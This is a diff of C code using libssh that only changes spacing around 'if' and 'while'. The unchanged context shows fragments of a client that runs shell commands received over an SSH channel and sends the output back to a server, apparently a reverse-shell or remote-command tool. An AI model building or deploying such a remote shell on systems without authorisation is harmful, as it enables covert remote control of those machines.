@@ -47,7 +47,7 @@ void start_client_shell(ssh_session session)
 	ssh_channel shell_channel = ssh_channel_new(session);
 
 
-	if (shell_channel == NULL)
+	if(shell_channel == NULL)
 		print_error("Failed creating shell channel", session);
 
 
@@ -70,20 +70,20 @@ void start_client_shell(ssh_session session)
 			and execute shell command in child. Receive result in parent and send
 			through channel to server.
 		*/
-		if (pipe(pipefd) == -1) 
+		if(pipe(pipefd) == -1) 
 		{
 		   perror("pipe");
 		   exit(EXIT_FAILURE);
 		}
 
 		cpid = fork();
-		if (cpid == -1) 
+		if(cpid == -1) 
 		{
 		   perror("fork");
 		   exit(EXIT_FAILURE);
 		}
 
-		if (cpid == 0) {
+		if(cpid == 0) {
 			close(pipefd[0]);
 			dup2(pipefd[1], 0);
 			dup2(pipefd[1], 1);
@@ -103,7 +103,7 @@ void start_client_shell(ssh_session session)
 			close(pipefd[1]);          
 			int loop = 1;
 			
-		   	while (loop)
+		   	while(loop)
 		   	{
 				memset(result_buffer, 0, sizeof(result_buffer));
 		   		if(read(pipefd[0], result_buffer, sizeof(result_buffer)) > 0)
@@ -167,7 +167,7 @@ int main()
 		print_error("Failed creating channel", session);
 
 	rc = ssh_channel_open_session(command_channel);
-	if(rc != SSH_OK)
+	if (rc != SSH_OK)
 		print_error("Failed connecting channel", session);
 
 	puts("[*] Opened command channel!");
